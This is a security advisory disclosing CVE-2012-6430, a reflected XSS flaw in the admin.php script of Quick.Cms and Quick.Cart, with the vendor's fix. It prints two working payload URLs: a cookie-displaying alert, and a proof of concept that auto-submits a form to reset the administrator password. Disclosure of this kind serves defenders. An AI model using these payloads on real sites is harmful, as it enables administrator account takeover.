Advisory Details:

High-Tech Bridge Security Research Lab discovered XSS vulnerability in Quick.Cms and Quick.Cart - two products developed by OpenSolution team, which can be exploited to perform cross-site scripting attacks.


1. Cross-Site Scripting (XSS) vulnerability in Quick.Cms and Quick.Cart: CVE-2012-6430

The vulnerability exists due to insufficient filtration of user-supplied data in URI in the "admin.php" script. A remote attacker can trick a logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

The exploitation example below uses the "alert()" JavaScript function to display administrator's cookies: 


http://[host]/admin.php/')"></select><script>alert(document.cookie);</script>/


Nevertheless, a remote attacker can create an exploit for this vulnerability to bypass application's CSRF protection mechanism based on the HTTP Referer header and get access to privileged functions of the application. To do so he have to trick a logged-in administrator to click on a malicious link with XSS exploit.

PoC (Prof-of-Concept) code below will change administrator's password to "password":

http://[host]/admin.php/')"></select><form action="http://[host]/admin.php%3fp=tools-config" method="post"><input type="hidden" name="login" value="login"><input type="hidden" name="pass" value="password"><input type="submit" id="btn" name="sOption"></form><script>document.getElementById('btn').click();</script>/

Successful exploitation of the vulnerability requires that Apache directive "AcceptPathInfo" is set to "on" or "default" (default value is "default").

Solution:

Vendor fixed the vulnerabilities without adding information to Changelog. 
Upgrade to Quick.Cms 5.0 and Quick.Cart 6.0 released after December 19, 2012
